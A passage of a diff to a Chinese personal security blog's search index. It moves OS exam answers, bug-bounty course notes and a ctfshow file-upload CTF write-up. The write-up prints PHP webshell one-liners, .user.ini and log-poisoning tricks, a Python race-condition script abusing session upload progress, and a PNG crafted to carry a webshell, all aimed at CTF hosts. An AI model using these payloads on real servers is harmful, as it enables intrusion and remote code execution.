-<li><p>设与某资源相关联的信号量初值为3，当前值为1，若M表示该资源的可用个数，N表示等待资源的进程数，则M，N分别是（）<br>解析：<br>信号量的初值表示系统中某类资源的数目，已知为3；<br>信号量的值小于等于0时，表示该类资源已分配完毕，此时信号量的绝对值表示在该信号量链表中已阻塞进程的数目。<br>信号量的值大于0时，表示该类资源还没有完全分配完，此时信号量的值表示该资源的可用个数。<br>信号量的当前值为1，大于0，则M表示该资源的可用个数为1，N表示等待资源的进程数为0。<br>答案：1，0  选A</p>
-</li>
-<li><p>某计算机系统中有8台打印机，有K个进程竞争使用，每个进程最多需要3台打印机。该系统可能会发生死锁的K的最小值（）<br>解析：<br>由于每个进程最多需要3台打印机，总共有8台打印机。<br>当有3个进程竞争使用时，每个进程能分配打印机数分别为3，3，2。有进程能释放资源，不会发生死锁。<br>当有4个进程竞争使用时，每个进程能分配2台打印机，不足以释放资源，即发生死锁。<br>因此最小值为4。<br>总结：用系统资源n-1除以进程最多需要的资源数m-1得到的结果向下取整的结果为不发生死锁的最大进程数。<br>答案：4，选C</p>
-</li>
-<li><p>设文件F1当前引用计数值为1，先建立F1的符号链接文件F2，再建立F1的硬链接文件F3，然后删除F1。此时F2和F3的引用计数值分别是（）<br>解析：<br>硬链接，同时改变源文件和链接文件连接数（+1），其实是同一个文件，文件类型是普通文件。<br>软链接，也叫符号链接，创建新的链接文件，文件类型，链接文件（l），是一个全新的文件，相当于快捷方式，不改变源文件链接数。<br>答案：1，1。选C</p>
-</li>
-<li><p>当进程因时间片用完而让出处理机时，该进程应转变为（）状态。<br>解析：<br><strong>进程调度的时机</strong><br>进程调度发生的时机（也称为调度点）与进程的状态变化有直接的关系。回顾进程状态变化图，我们可以看到进程调度的时机直接与进程在运行态&lt;--&gt;退出态&#x2F;就绪态&#x2F;阻塞态的转变时机相关。简而言之，引起进程调度的时机可归结为以下几类：</p>
-</li>
-</ol>
-<ul>
-<li>正在执行的进程执行完毕，需要选择新的就绪进程执行。</li>
-<li>正在执行的进程调用相关系统调用（包括与I/O操作，同步互斥操作等相关的系统调用）导致需等待某事件发生或等待资源可用，从而将白己阻塞起来进入阻塞状态。</li>
-<li>正在执行的进程主动调用放弃CPU的系统调用，导致自己的状态为就绪态，且把自己重新放到就绪队列中。</li>
-<li>等待事件发生或资源可用的进程等待队列，从而导致进程从阻塞态回到就绪态，并可参与到调度中。</li>
-<li>正在执行的进程的时间片已经用完，致自己的状态为就绪态，且把自己重新放到就绪队列中。</li>
-<li>在执行完系统调用后准备返回用户进程前的时刻，可调度选择一新用户进程执行</li>
-<li>就绪队列中某进程的优先级变得高于当前执行进程的优先级，从而也将引发进程调度。</li>
-<li>有序列表内容<br>答案：就绪，选B</li>
-</ul>
-<ol start="29">
-<li><p>文件的保密是指防止文件被（）<br>解析：<br>文件的保护:防止文件被破坏。<br>文件的保密:防止文件被窃取。<br>答案：窃取，选C</p>
-</li>
-<li><p>为了允许不同用户的文件具有相通的文件名，通常在文件系统中采用（）<br>答案：多级目录，选B</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>OS</category>
-        <category>习题</category>
-      </categories>
-      <tags>
-        <tag>OS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE漏洞</title>
     <url>/2022/12/10/RCE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到RCE了，感觉在漏洞中会很常见。</p>
@@ -1940,23 +1960,6 @@ ThinkPHP5.x的命令执行
       </tags>
   </entry>
   <entry>
-    <title>SRC_course_4</title>
-    <url>/2023/05/29/SRC_course_4/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一阶段的最后一部分。</p>
-<span id="more"></span>
-
-<h1 id="一个站挖洞的思路"><a href="#一个站挖洞的思路" class="headerlink" title="一个站挖洞的思路"></a>一个站挖洞的思路</h1><p>功能点一个个过。<br>首先看页面，然后看URL。<br>登录口：如果有手机号，那么验证码。<br>弱口令，爆破，注入，XSS<br>验证码可以自己在URL加入参数自己构造。<br>验证码抓包多次重放看提示，是否可复用。（验证码复用漏洞）<br>查看参数是否有URL，在url后添加网址查看是否会跳转（跳转漏洞）</p>
-<h1 id="一堆站，怎么选择目标"><a href="#一堆站，怎么选择目标" class="headerlink" title="一堆站，怎么选择目标"></a>一堆站，怎么选择目标</h1><p>首先看能否登进去，首先考虑登录的。不考虑SSO</p>
-<h1 id="如何快速挖到有效漏洞"><a href="#如何快速挖到有效漏洞" class="headerlink" title="如何快速挖到有效漏洞"></a>如何快速挖到有效漏洞</h1><p>灯塔工具，泄露，捡洞，搜索引擎</p>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
-      <categories>
-        <category>SRC</category>
-      </categories>
-      <tags>
-        <tag>SRC</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SRC_course_3</title>
     <url>/2023/05/13/SRC_course_3/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第3节课，2小时，还是有点长。</p>
@@ -2026,6 +2029,23 @@ ThinkPHP5.x的命令执行
 <h1 id="跳转漏洞"><a href="#跳转漏洞" class="headerlink" title="跳转漏洞"></a>跳转漏洞</h1><p>在火狐浏览器里，访问 <code>github.com@google.com</code><br>最后会跳转到 <code>google.com</code></p>
 <p>绕过技巧：<br><code>example.com/urlredirect.php?url=http://example.com/evil.com</code></p>
 ]]></content>
+      <categories>
+        <category>SRC</category>
+      </categories>
+      <tags>
+        <tag>SRC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SRC_course_4</title>
+    <url>/2023/05/29/SRC_course_4/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一阶段的最后一部分。</p>
+<span id="more"></span>
+
+<h1 id="一个站挖洞的思路"><a href="#一个站挖洞的思路" class="headerlink" title="一个站挖洞的思路"></a>一个站挖洞的思路</h1><p>功能点一个个过。<br>首先看页面，然后看URL。<br>登录口：如果有手机号，那么验证码。<br>弱口令，爆破，注入，XSS<br>验证码可以自己在URL加入参数自己构造。<br>验证码抓包多次重放看提示，是否可复用。（验证码复用漏洞）<br>查看参数是否有URL，在url后添加网址查看是否会跳转（跳转漏洞）</p>
+<h1 id="一堆站，怎么选择目标"><a href="#一堆站，怎么选择目标" class="headerlink" title="一堆站，怎么选择目标"></a>一堆站，怎么选择目标</h1><p>首先看能否登进去，首先考虑登录的。不考虑SSO</p>
+<h1 id="如何快速挖到有效漏洞"><a href="#如何快速挖到有效漏洞" class="headerlink" title="如何快速挖到有效漏洞"></a>如何快速挖到有效漏洞</h1><p>灯塔工具，泄露，捡洞，搜索引擎</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
       <categories>
         <category>SRC</category>
       </categories>
@@ -3040,6 +3060,70 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
       </tags>
   </entry>
   <entry>
+    <title>ctfshow-web入门-文件上传</title>
+    <url>/2023/01/11/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没啥好说的。</p>
+<span id="more"></span>
+<h1 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h1><ol>
+<li>分析<br>通过尝试可知，这是在前端验证，于是我们尝试禁用js，但是会导致无法上传文件，于是放弃该方案。<br>然后通过尝试上传文件发现，只能上传后缀为png格式的文件，我们可以将一句话木马改为png格式上传，再用burp抓包后改为php后缀，最后使用蚁剑连接即可。</li>
+<li>上传<br>和分析情况相同，直接上传成功，用蚁剑连接后，在上一级目录拿到flag。</li>
+</ol>
+<h1 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h1><p>考点是MIME Type，验证Content-Type是否为Image&#x2F;png<br>方式和前一题一样</p>
+<h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><p>是关于.user.ini的应用，实际上就是一个用户可以修改的配置文件，之前的一道CTF题里提及过该<a href="https://truthnian.github.io/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/">知识点</a>。</p>
+<ol>
+<li>上传<br>首先写好一个一句话木马，修改为c.png文件，直接上传<br>然后写好一个.user.ini文件，内容为：<br><code>auto_prepend_file=c.png</code><br>然后把该文件后缀改为png，抓包后再修改回ini<br>上传成功后，蚁剑连接：<br><code>http://46665bc5-3785-4b06-8c0a-4c3520c474bf.challenge.ctf.show/upload/</code><br>即可拿到flag</li>
+</ol>
+<h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>本题检测了文件中的php字符串，一句话木马可以改为简写方式：<br><code>&lt;?=eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code><br>或者大小写绕过</p>
+<p>和上一题方法一样<br>成功拿到flag</p>
+<h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><p>过滤了php，只能使用简写方式。</p>
+<p>和上一题方法一样<br>成功拿到flag</p>
+<h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>多次尝试发现是过滤了[]<br>于是我们将一句话木马改为：<br><code>&lt;?=eval($_REQUEST&#123;&#39;cmd&#39;&#125;);?&gt;</code><br>仍然需要上传.user.ini文件<br>成功拿到flag</p>
+<h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>被过滤了的有 <code>php, [], ;</code><br>因此无法使用一句话木马，我们改为执行代码，使用system函数显示出所需的flag文件<br>仍然需要上传.user.ini文件<br>成功拿到flag</p>
+<p>将文件内容修改为：<br><code>&lt;?=system(&#39;cat ../f*&#39;)?&gt;</code><br>然后上传，<br>仍然需要上传.user.ini文件<br>完毕后访问页面: <code>url/upload/index.php</code><br>查看源代码，最终拿到flag</p>
+<h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p>仍然需要上传.user.ini文件<br>和上一题几乎一致，访问页面: <code>url/upload</code><br>查看源代码，最终拿到flag</p>
+<h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><p>由于过滤了 <code>()</code><br>所以我们使用反引号(`)，由此代码为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`cat ../f*`?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h1><p>Linux下：<br>nginx的默认日志地址为: <code>/var/log/nginx/access.log</code><br>apache的默认日志地址为: <code>/var/log/apache2/access.log</code></p>
+<p>在这道题中，反引号和空格均被过滤，那么我们采用日志文件包含。<br>原理是将一句话木马写入ua中，然后ua的内容会传到日志文件，由于我们将日志文件包含了，那么就能显示一句话木马，也即可以连接蚁剑。<br>首先，日志文件默认格式为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_format access &#x27;$remote_addr – $remote_user [$time_local] &quot;$request&quot;&#x27; &#x27;$status $body_bytes_sent &quot;$http_referer&quot;&#x27; &#x27;&quot;$http_user_agent&quot; $http_x_forwarded_for&#x27;;</span><br></pre></td></tr></table></figure>
+<p>于是我们可以写入文件内容如下:<br><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>同时抓包，修改ua为一句话木马。<br>最后通过蚁剑连接：<br><code>http://6514c240-517e-4eca-b889-2f61dacb8762.challenge.ctf.show/upload/</code><br>即可拿到flag</p>
+<h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><p>这道题利用 <code>getimagesize()</code> 函数验证文件头，那么我们可以使用 <code>GIF89a</code> 绕过检测。<br>只需在上一题的基础上，在每个文件加上GIF89a即可。</p>
+<h1 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h1><ol>
+<li><p>分析<br>这一次过滤了 <code>. flag</code>因此无法再使用原来的方式绕过，那么我们可以使用SESSION文件包含+条件竞争方式获取flag<br>这里有两篇文章可以详细解释SESSION文件包含的原理：<br><a href="https://www.php.net/manual/zh/session.upload-progress.php">Session 上传进度</a><br><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含</a><br>简单说一下原理：<br>在php.ini有以下几个默认选项：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">//表示upload_progress的功能开始，当浏览器向服务器上传一个文件时，</span><br><span class="line">//php将会把这次文件上传的详细信息（如上传时间，进度等）存储在session中，可以发送一个POST请求终端来检查这个状态</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">//表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">//name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">//prefix+name将表示为session中的键名</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br><span class="line">7. session.use_strict_mode=0</span><br><span class="line">//此时用户可以自定义Session ID.</span><br><span class="line">//比如：在Cookie里设置PHPSESSID=123,PHP将在服务器上创建一个文件: /tmp/sess_123</span><br><span class="line">//即使此时用户没有初始化Session，也会自动初始化Session,并产生一个prefix+name连接在一起的值。</span><br></pre></td></tr></table></figure>
+<p>也就是说，Session文件里有flag，当用POST方式带有命令执行的数据访问页面时，Session文件里会包含有flag数据，因此我们可以尝试获取Session文件的数据来获取flag，但由于Session文件的数据很快会被php.ini中的 <code>session.upload_progress.cleanup = on</code> 清空，因此我们需要采取条件竞争的方式获取flag。</p>
+</li>
+<li><p>上传<br>首先上传.user.ini,内容是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=&quot;png&quot;</span><br></pre></td></tr></table></figure>
+<p>然后上传png，内容是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/tmp/sess_123&quot;?&gt;</span><br></pre></td></tr></table></figure>
+<p>最后使用python写一个条件竞争的脚本</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">url1 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这段代码利用PHP Web应用程序中的竞争条件读取包含flag的文件。<br>设置了‘PHPSESSID’的cookies为’sess’的值为’123’<br>创建了两个线程: 一个重复发送POST请求到url1变量指定的URL，带有一个 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，设置为包含PHP命令注入有效负载 <code>（&lt;?php system(&quot;tac ../f*&quot;);?&gt;）</code> 的字符串，另一个则重复发送GET请求到url2变量指定的URL，检查响应文本的”flag”字符串。</p>
+</li>
+</ol>
+<h1 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h1><p>与上一题相同</p>
+<h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>图片上传后会对其重命名，并且需要上传真实的png图片。<br>一般的一句话木马图片上传后会对其二次渲染，导致图片内的木马消失。</p>
+<p>图片二次渲染是指对已经存在的图片进行修改或重新绘制的过程。这可以包括调整图像的颜色，添加新元素，或者删除现有元素等。<br>二次渲染可以用来改变图片的外观，或者用来添加水印，或者用来删除不需要的元素。它也可以用来调整图像的尺寸，或者对图像进行格式转换等。<br>图像二次渲染可以使用许多不同的工具来实现，包括专业的图像编辑软件，如 Photoshop 或 GIMP，也可以使用编程语言和图像处理库，如 PHP GD 库。<br>在图像处理过程中，二次渲染可以使用许多不同的技术，如图像分析、图像滤镜、图像插值和图像变换等。</p>
+<p>因此我们需要通过PHP GD库来创建一张含有木马的图片能绕过服务器的二次渲染。PHP代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;D:/temp/b2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 图片内木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段代码使用了 PHP GD 库来创建一张新图片，尺寸为32x32像素。然后它使用一个十六进制数组来循环，并使用红色、绿色和蓝色值来设置图像中的像素。最后将图像保存为”b2.png”，保存在temp目录中。<br>将该图片上传后，访问该图片地址，并且传入以下参数：<br>GET:<br><code>http://eef25c0f-86f4-4cc9-9269-c17440f534c2.challenge.ctf.show/download.php?image=88c1ceb8ad1b0be7870b26ce8f79acc7.png&amp;0=system</code><br>POST:<br><code>1=cat f*</code></p>
+<p>这样便能拿到flag</p>
+<h1 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h1><p>jpg的二次渲染，但我没成功，暂时搁置吧</p>
+<h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>仍然失败，看来需要暂时做点别的换换心情了。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow-web入门-命令执行</title>
     <url>/2023/01/16/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前进，前进，不能停下脚步！</p>
@@ -3162,70 +3246,6 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
       <tags>
         <tag>CTF</tag>
         <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfshow-web入门-文件上传</title>
-    <url>/2023/01/11/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没啥好说的。</p>
-<span id="more"></span>
-<h1 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h1><ol>
-<li>分析<br>通过尝试可知，这是在前端验证，于是我们尝试禁用js，但是会导致无法上传文件，于是放弃该方案。<br>然后通过尝试上传文件发现，只能上传后缀为png格式的文件，我们可以将一句话木马改为png格式上传，再用burp抓包后改为php后缀，最后使用蚁剑连接即可。</li>
-<li>上传<br>和分析情况相同，直接上传成功，用蚁剑连接后，在上一级目录拿到flag。</li>
-</ol>
-<h1 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h1><p>考点是MIME Type，验证Content-Type是否为Image&#x2F;png<br>方式和前一题一样</p>
-<h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><p>是关于.user.ini的应用，实际上就是一个用户可以修改的配置文件，之前的一道CTF题里提及过该<a href="https://truthnian.github.io/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/">知识点</a>。</p>
-<ol>
-<li>上传<br>首先写好一个一句话木马，修改为c.png文件，直接上传<br>然后写好一个.user.ini文件，内容为：<br><code>auto_prepend_file=c.png</code><br>然后把该文件后缀改为png，抓包后再修改回ini<br>上传成功后，蚁剑连接：<br><code>http://46665bc5-3785-4b06-8c0a-4c3520c474bf.challenge.ctf.show/upload/</code><br>即可拿到flag</li>
-</ol>
-<h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>本题检测了文件中的php字符串，一句话木马可以改为简写方式：<br><code>&lt;?=eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code><br>或者大小写绕过</p>
-<p>和上一题方法一样<br>成功拿到flag</p>
-<h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><p>过滤了php，只能使用简写方式。</p>
-<p>和上一题方法一样<br>成功拿到flag</p>
-<h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>多次尝试发现是过滤了[]<br>于是我们将一句话木马改为：<br><code>&lt;?=eval($_REQUEST&#123;&#39;cmd&#39;&#125;);?&gt;</code><br>仍然需要上传.user.ini文件<br>成功拿到flag</p>
-<h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>被过滤了的有 <code>php, [], ;</code><br>因此无法使用一句话木马，我们改为执行代码，使用system函数显示出所需的flag文件<br>仍然需要上传.user.ini文件<br>成功拿到flag</p>
-<p>将文件内容修改为：<br><code>&lt;?=system(&#39;cat ../f*&#39;)?&gt;</code><br>然后上传，<br>仍然需要上传.user.ini文件<br>完毕后访问页面: <code>url/upload/index.php</code><br>查看源代码，最终拿到flag</p>
-<h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p>仍然需要上传.user.ini文件<br>和上一题几乎一致，访问页面: <code>url/upload</code><br>查看源代码，最终拿到flag</p>
-<h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><p>由于过滤了 <code>()</code><br>所以我们使用反引号(`)，由此代码为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`cat ../f*`?&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h1><p>Linux下：<br>nginx的默认日志地址为: <code>/var/log/nginx/access.log</code><br>apache的默认日志地址为: <code>/var/log/apache2/access.log</code></p>
-<p>在这道题中，反引号和空格均被过滤，那么我们采用日志文件包含。<br>原理是将一句话木马写入ua中，然后ua的内容会传到日志文件，由于我们将日志文件包含了，那么就能显示一句话木马，也即可以连接蚁剑。<br>首先，日志文件默认格式为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_format access &#x27;$remote_addr – $remote_user [$time_local] &quot;$request&quot;&#x27; &#x27;$status $body_bytes_sent &quot;$http_referer&quot;&#x27; &#x27;&quot;$http_user_agent&quot; $http_x_forwarded_for&#x27;;</span><br></pre></td></tr></table></figure>
-<p>于是我们可以写入文件内容如下:<br><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>同时抓包，修改ua为一句话木马。<br>最后通过蚁剑连接：<br><code>http://6514c240-517e-4eca-b889-2f61dacb8762.challenge.ctf.show/upload/</code><br>即可拿到flag</p>
-<h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><p>这道题利用 <code>getimagesize()</code> 函数验证文件头，那么我们可以使用 <code>GIF89a</code> 绕过检测。<br>只需在上一题的基础上，在每个文件加上GIF89a即可。</p>
-<h1 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h1><ol>
-<li><p>分析<br>这一次过滤了 <code>. flag</code>因此无法再使用原来的方式绕过，那么我们可以使用SESSION文件包含+条件竞争方式获取flag<br>这里有两篇文章可以详细解释SESSION文件包含的原理：<br><a href="https://www.php.net/manual/zh/session.upload-progress.php">Session 上传进度</a><br><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含</a><br>简单说一下原理：<br>在php.ini有以下几个默认选项：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">//表示upload_progress的功能开始，当浏览器向服务器上传一个文件时，</span><br><span class="line">//php将会把这次文件上传的详细信息（如上传时间，进度等）存储在session中，可以发送一个POST请求终端来检查这个状态</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">//表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">//name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">//prefix+name将表示为session中的键名</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br><span class="line">7. session.use_strict_mode=0</span><br><span class="line">//此时用户可以自定义Session ID.</span><br><span class="line">//比如：在Cookie里设置PHPSESSID=123,PHP将在服务器上创建一个文件: /tmp/sess_123</span><br><span 